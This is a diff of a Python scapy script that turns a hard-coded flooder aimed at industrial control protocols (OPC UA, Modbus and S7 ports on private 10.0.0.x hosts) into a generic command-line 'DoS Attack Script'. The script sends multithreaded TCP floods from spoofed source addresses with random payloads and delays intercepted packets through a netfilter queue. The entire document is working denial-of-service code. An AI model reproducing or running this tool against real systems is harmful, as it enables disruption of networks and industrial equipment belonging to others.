@@ -1,85 +1,61 @@
 import random
+import string
 from time import sleep
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-target_IP_OPC = "10.0.0.3" #port 4840
+import threading
+import argparse
 
-target_IP_Mod = "10.0.0.2" #port 502
 
-target_IP_s7 ="10.0.0.1" #port 102
-
+# Define global variables
 used_ips = []
 
-def get_random_ip():
+def get_random_ip(base_ip):
     valid_ip = False
     while not valid_ip:
-        first_part = "172.17.0."
-        last_part = str(random.randint(1,254))
-        final_ip = first_part + last_part
+        last_part = str(random.randint(1, 254))
+        final_ip = f"{base_ip}.{last_part}"
         if final_ip not in used_ips:
             used_ips.append(final_ip)
             valid_ip = True
     return final_ip
 
-
-def dos_opc():
-    src_ip = get_random_ip()
-    print(src_ip)
-    for i in range(0,1000000):
-        src_port = random.randint(1,65535)
-        ip = IP(src = src_ip, dst=target_IP_OPC)
-        tcp = TCP(sport= src_port, dport=4840)
+def dos_attack(target_ip, target_port, num_packets, delay_interval):
+    src_ip = get_random_ip("172.17.0")
+    print(f"Using source IP: {src_ip}")
+    for _ in range(num_packets):
+        src_port = random.randint(1, 65535)
+        ip = IP(src=src_ip, dst=target_ip)
+        tcp = TCP(sport=src_port, dport=target_port)
         pkt = ip / tcp / Raw(RandString(size=100))
-        send(pkt,inter=.001)
+        send(pkt, inter=0.001)
+        sleep(delay_interval)
 
-
-def dos_modbus():
-    src_ip = get_random_ip()
-    print(src_ip)
-    for i in range(0,1000000):
-        src_port = random.randint(1,65535)
-        ip = IP(src = src_ip, dst=target_IP_Mod)
-        tcp = TCP(sport= src_port, dport=502)
-        pkt = ip / tcp / Raw(RandString(size=100))
-        send(pkt,inter=.001)
-
-def dos_s7():
-    src_ip = get_random_ip()
-    print(src_ip)
-    for i in range(0,1000000):
-        src_port = random.randint(1,65535)
-        ip = IP(src = src_ip, dst=target_IP_s7)
-        tcp = TCP(sport= src_port, dport=102)
-        pkt = ip / tcp / Raw(RandString(size=100))
-        send(pkt,inter=.001)
-
-
-def delay(packet):
-    print("Entra muchisisismo")
-    tempo = random.uniform(0.5,10)
-    sleep(tempo)
+def delay(packet, delay_interval):
+    sleep(random.uniform(*delay_interval))
     packet.accept()
 
-if __name__=="__main__":
-    for i in range(0,9):
-        if i in range(0,3):
-            x = threading.Thread(target=dos_opc, args=())
-            x.start()
-        elif i in range(3,6):
-            x = threading.Thread(target=dos_modbus, args=())
-            x.start()
-        else:
-            x = threading.Thread(target=dos_s7, args=())
-            x.start()
-    
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="DoS Attack Script")
+    parser.add_argument('--target-ip', type=str, required=True, help="Target IP address")
+    parser.add_argument('--target-port', type=int, required=True, help="Target port")
+    parser.add_argument('--packets', type=int, default=1000000, help="Number of packets to send")
+    parser.add_argument('--delay-min', type=float, default=0.5, help="Minimum delay for packet processing")
+    parser.add_argument('--delay-max', type=float, default=10.0, help="Maximum delay for packet processing")
+    parser.add_argument('--threads', type=int, default=9, help="Number of threads for attacks")
+
+    args = parser.parse_args()
+
+    delay_interval = (args.delay_min, args.delay_max)
+
+    for i in range(args.threads):
+        t = threading.Thread(target=dos_attack, args=(args.target_ip, args.target_port, args.packets, 0.001))
+        t.start()
+
     nfqueue = NetfilterQueue()
-    nfqueue.bind(2, delay)
+    nfqueue.bind(2, lambda pkt: delay(pkt, delay_interval))
     try:
-        print ("[*] waiting for data to delay")
+        print("[*] Waiting for data to delay")
         nfqueue.run()
     except KeyboardInterrupt:
         nfqueue.unbind()
-    
-
-
-   
